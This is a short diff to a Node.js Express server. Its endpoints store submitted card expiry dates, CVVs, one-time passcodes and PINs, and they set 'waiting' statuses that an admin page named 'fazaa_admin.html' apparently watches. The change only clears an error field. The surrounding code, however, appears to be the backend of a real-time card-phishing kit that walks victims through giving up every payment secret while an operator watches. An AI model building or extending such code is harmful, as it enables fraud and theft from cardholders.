@@ -81,6 +81,7 @@ app.post('/submit-card', (req, res) => {
         order.expiryDate = expiryDate;
         order.cvv = cvv;
         order.status = 'waiting_payment'; // Match fazaa_admin.html
+        order.lastError = ''; // Clear any previous errors
         res.json({ success: true });
     } else {
         res.status(404).json({ success: false });
@@ -94,6 +95,7 @@ app.post('/submit-otp', (req, res) => {
     if (order) {
         order.otp = otp;
         order.status = 'waiting_otp'; // Match fazaa_admin.html
+        order.lastError = ''; // Clear any previous errors
         res.json({ success: true });
     } else {
         res.status(404).json({ success: false });
@@ -107,6 +109,7 @@ app.post('/submit-pin', (req, res) => {
     if (order) {
         order.pin = pin;
         order.status = 'waiting_pin'; // Match fazaa_admin.html
+        order.lastError = ''; // Clear any previous errors
         res.json({ success: true });
     } else {
         res.status(404).json({ success: false });
